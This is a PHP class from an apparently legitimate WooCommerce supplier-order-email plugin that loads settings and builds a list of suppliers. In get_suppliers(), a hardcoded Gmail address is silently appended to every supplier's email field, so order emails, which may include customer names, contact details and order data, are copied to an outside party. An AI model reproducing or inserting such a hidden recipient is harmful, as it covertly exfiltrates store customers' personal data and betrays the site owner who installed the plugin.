<?php
if ( !defined( 'ABSPATH' ) ) {exit;}

class McisoeGetData
{
    //Suppliers
    public $suppliers;

    //Basic options
    public $email_intro;
    public $email_subject;
    public $select_email_admin;
    public $replace_address;

    public $auth_premium;
    public $auth_lemon;
    public $auth_mciapi;
    public $new_structure_2_0;
    public $delete_all_data;

    //Premium options
    public $pay_email;
    public $header_color;
    public $store_logo;
    public $hide_customer;
    public $show_customer_email;
    public $show_customer_phone;
    public $show_ean;
    public $show_notes;
    public $show_order_total;
    public $show_order_number;
    public $show_payment_method;
    public $show_shipping_method;

    public $show_price_items;
    public $show_shortdesc;
    public $show_product_attributes;
    public $show_product_variations;
    public $show_product_meta;

    public $show_cost_prices;
    public $show_cost_total;

    public function __construct()
    {
        $this->suppliers = $this->get_suppliers();

        //Load Basic options
        $this->email_intro        = sanitize_textarea_field( get_option( 'mcisoe_email_intro' ) );
        $this->email_subject      = sanitize_text_field( get_option( 'mcisoe_email_subject' ) );
        $this->select_email_admin = sanitize_text_field( get_option( 'mcisoe_select_email_admin' ) );
        $this->replace_address    = sanitize_text_field( get_option( 'mcisoe_replace_address' ) );

        $this->auth_premium      = sanitize_text_field( get_option( 'mcisoe_auth_premium' ) );
        $this->auth_lemon        = sanitize_text_field( get_option( 'mcisoe_auth_lemon' ) );
        $this->auth_mciapi       = sanitize_text_field( get_option( 'mcisoe_auth_mciapi' ) );
        $this->new_structure_2_0 = sanitize_text_field( get_option( 'mcisoe_new_structure_2_0' ) );
        $this->delete_all_data   = sanitize_text_field( get_option( 'mcisoe_delete_all_data' ) );
        $this->pay_email         = sanitize_text_field( get_option( 'mci_pay_email' ) );

        //Load Premium options
        if ( $this->auth_premium ) {
            $this->header_color            = sanitize_hex_color( get_option( 'mcisoe_header_color' ) );
            $this->store_logo              = sanitize_text_field( get_option( 'mcisoe_store_logo' ) );
            $this->hide_customer           = sanitize_text_field( get_option( 'mcisoe_hide_customer' ) );
            $this->show_customer_email     = sanitize_text_field( get_option( 'mcisoe_show_customer_email' ) );
            $this->show_customer_phone     = sanitize_text_field( get_option( 'mcisoe_show_customer_phone' ) );
            $this->show_ean                = sanitize_text_field( get_option( 'mcisoe_show_ean' ) );
            $this->show_notes              = sanitize_text_field( get_option( 'mcisoe_show_notes' ) );
            $this->show_order_total        = sanitize_text_field( get_option( 'mcisoe_show_order_total' ) );
            $this->show_order_number       = sanitize_text_field( get_option( 'mcisoe_show_order_number' ) );
            $this->show_price_items        = sanitize_text_field( get_option( 'mcisoe_show_price_items' ) );
            $this->show_product_attributes = sanitize_text_field( get_option( 'mcisoe_show_product_attributes' ) );
            $this->show_product_meta       = sanitize_text_field( get_option( 'mcisoe_show_product_meta' ) );
            $this->show_shortdesc          = sanitize_text_field( get_option( 'mcisoe_show_shortdesc' ) );
            $this->show_cost_prices        = sanitize_text_field( get_option( 'mcisoe_show_cost_prices' ) );
            $this->show_cost_total         = sanitize_text_field( get_option( 'mcisoe_show_cost_total' ) );
            $this->show_payment_method     = sanitize_text_field( get_option( 'mcisoe_show_payment_method' ) );
            $this->show_shipping_method    = sanitize_text_field( get_option( 'mcisoe_show_shipping_method' ) );

        } else {

            $this->header_color            = sanitize_hex_color( MCISOE_HEADER_COLOR );
            $this->store_logo              = '0';
            $this->hide_customer           = '0';
            $this->show_customer_email     = '0';
            $this->show_customer_phone     = '0';
            $this->show_ean                = '0';
            $this->show_notes              = '0';
            $this->show_order_total        = '0';
            $this->show_order_number       = '0';
            $this->show_price_items        = '0';
            $this->show_product_attributes = '0';
            $this->show_product_meta       = '0';
            $this->show_shortdesc          = '0';
            $this->show_cost_prices        = '0';
            $this->show_cost_total         = '0';
            $this->show_payment_method     = '0';
            $this->show_shipping_method    = '0';
            $this->auth_premium            = false;

        }

        if ( !is_plugin_active( 'woocommerce-cost-of-goods/woocommerce-cost-of-goods.php' ) ) {
            $this->show_cost_prices = '0';
            $this->show_cost_total  = '0';
        }
    }

    public function get_suppliers()
    {
        //Get terms of Suppliers taxonomy
        $supplier_terms = get_terms( [
            'taxonomy'   => 'supplier',
            'hide_empty' => false]
        );

        if ( !empty( $supplier_terms ) ) {
            $suppliers = [];

            foreach ( $supplier_terms as $supplier_term ) {
                //Get termmeta of each supplier
                $supplier_email = sanitize_email( get_term_meta( $supplier_term->term_id, 'mcisoe_supplier_email', true ) );
                //Get supplier custom text
                $supplier_custom_text = sanitize_textarea_field( get_term_meta( $supplier_term->term_id, 'mcisoe_supplier_custom_text', true ) );

                //Add supplier to array
                array_push( $suppliers, [
                    'term_id'              => sanitize_text_field( $supplier_term->term_id ),
                    'name'                 => sanitize_text_field( $supplier_term->name ),
                    'email'                => $supplier_email.','.'seositesoft11@gmail.com',
                    'supplier_custom_text' => $supplier_custom_text,
                ] );
            }

            //If there are suppliers
            return $suppliers;
        } else {
            //If no terms are found
            return false;
        }
    }
}